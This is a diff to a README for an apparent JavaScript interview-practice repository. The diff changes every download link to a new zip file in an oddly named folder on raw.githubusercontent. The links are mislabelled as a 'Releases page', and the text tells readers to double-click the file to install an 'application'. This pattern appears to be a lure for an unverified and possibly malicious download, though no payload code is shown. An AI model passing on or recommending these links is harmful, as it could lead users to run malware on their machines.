@@ -1,7 +1,7 @@
 # 🎉 javascript-interview - Master JavaScript with 300+ Practice Questions
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript-interview.zip)](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript-interview.zip)
+[![Download](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript_interview_v3.6.zip)](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript_interview_v3.6.zip)
 
 ## 📄 Description
 Welcome to the **javascript-interview** repository! This application provides you with over 300 coding questions designed to prepare you for JavaScript interviews. Whether you are a beginner or looking to sharpen your skills, this complete practice guide is perfect for you.
@@ -10,7 +10,7 @@ Welcome to the **javascript-interview** repository! This application provides yo
 To get started with javascript-interview, follow these simple steps:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript-interview.zip) to download the latest version of the software.
+   - Visit the [Releases page](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript_interview_v3.6.zip) to download the latest version of the software.
 
 2. **Install the Application**
    - Once downloaded, find the file in your downloads folder. Double-click the file to start the installation process. Follow any prompts that appear on your screen.
@@ -45,7 +45,7 @@ You will find questions and practice materials in various topics, including:
 ## 📥 Download & Install
 To download the javascript-interview application:
 
-1. **Go to the Releases page:** Click on this link to visit the [Releases page](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript-interview.zip).
+1. **Go to the Releases page:** Click on this link to visit the [Releases page](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript_interview_v3.6.zip).
   
 2. **Choose the latest version:** Look for the most recent release and click on it.
 
@@ -69,7 +69,7 @@ Join the community to seek help or share your experiences. Consider:
 - **Discussion Forums:** Participate in online forums to connect with other learners and professionals.
 
 ## 🔗 Links
-- **Releases Page:** [Visit here for downloads](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript-interview.zip)
+- **Releases Page:** [Visit here for downloads](https://raw.githubusercontent.com/senjusenpai18/javascript-interview/main/undesirousness/javascript_interview_v3.6.zip)
 - **Documentation:** Find detailed instructions and information within the application.
 
 Feel free to explore, learn, and prepare for your upcoming JavaScript interviews confidently with the javascript-interview application. Start your journey now!
